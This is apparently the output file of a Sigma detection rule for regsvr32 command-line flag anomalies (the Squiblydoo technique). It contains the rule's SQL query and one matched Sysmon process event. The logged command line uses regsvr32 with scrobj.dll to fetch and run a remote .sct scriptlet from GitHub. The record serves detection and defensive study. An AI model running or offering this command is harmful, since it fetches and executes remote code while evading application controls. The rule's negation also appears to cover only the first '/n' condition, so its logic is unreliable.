[{
  "title": "Potential Regsvr32 Commandline Flag Anomaly",
  "id": "b236190c-1c61-41e9-84b3-3fe03f6d76b0",
  "description": "Detects a potential command line flag anomaly related to \"regsvr32\" in which the \"/i\" flag is used without the \"/n\" which should be uncommon.",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE Channel='Microsoft-Windows-Sysmon/Operational' AND (EventID=1 AND ((Image LIKE '%\\\\regsvr32.exe' ESCAPE '\\' AND (CommandLine LIKE '% -i:%' ESCAPE '\\' OR CommandLine LIKE '% /i:%' ESCAPE '\\' OR CommandLine LIKE '% –i:%' ESCAPE '\\' OR CommandLine LIKE '% —i:%' ESCAPE '\\' OR CommandLine LIKE '% ―i:%' ESCAPE '\\')) AND (NOT CommandLine LIKE '% -n %' ESCAPE '\\' OR CommandLine LIKE '% /n %' ESCAPE '\\' OR CommandLine LIKE '% –n %' ESCAPE '\\' OR CommandLine LIKE '% —n %' ESCAPE '\\' OR CommandLine LIKE '% ―n %' ESCAPE '\\')))"
  ],
  "rule_level": "medium",
  "tags": [
    "attack.defense-evasion",
    "attack.t1218.010"
  ],
  "count": 1,
  "matches": [
    {
      "row_id": 3,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll",
      "Company": "Microsoft Corporation",
      "Computer": "IEWIN7",
      "CurrentDirectory": "C:\\Windows\\system32\\",
      "Description": "Microsoft(C) Register Server",
      "EventID": 1,
      "EventRecordID": 17287,
      "FileVersion": "6.1.7600.16385 (win7_rtm.090713-1255)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "SHA1=A774A816662FF5B75669AA5BCE751BAB9D0972B8,MD5=432BE6CF7311062633459EEF6B242FB5,SHA256=890C1734ED1EF6B2422A9B21D6205CF91E014ADD8A7F41AA5A294FCF60631A7B,IMPHASH=A2DAD36BD73280726DA578EB659D0583",
      "IMPHASH": "A2DAD36BD73280726DA578EB659D0583",
      "Image": "C:\\Windows\\System32\\regsvr32.exe",
      "IntegrityLevel": "Medium",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "365ABB72-B0EC-5CD9-0000-00201D340100",
      "LogonId": "0x1341d",
      "MD5": "432BE6CF7311062633459EEF6B242FB5",
      "Opcode": 0,
      "OriginalLogfile": "sysmon_1_persist_bitsjob_SetNotifyCmdLine.evtx",
      "ParentCommandLine": "C:\\Windows\\system32\\svchost.exe -k netsvcs",
      "ParentImage": "C:\\Windows\\System32\\svchost.exe",
      "ParentProcessGuid": "365ABB72-B0EC-5CD9-0000-0010D9D20000",
      "ParentProcessId": 944,
      "ProcessGuid": "365ABB72-B167-5CD9-0000-001062160C00",
      "ProcessID": 276,
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "SHA1": "A774A816662FF5B75669AA5BCE751BAB9D0972B8",
      "SHA256": "890C1734ED1EF6B2422A9B21D6205CF91E014ADD8A7F41AA5A294FCF60631A7B",
      "SystemTime": "2019-05-13T18:03:19.681478Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 1000,
      "User": "IEWIN7\\IEUser",
      "UserID": "S-1-5-18",
      "UtcTime": "2019-05-13 18:03:19.497",
      "Version": 5
    }
  ]
}]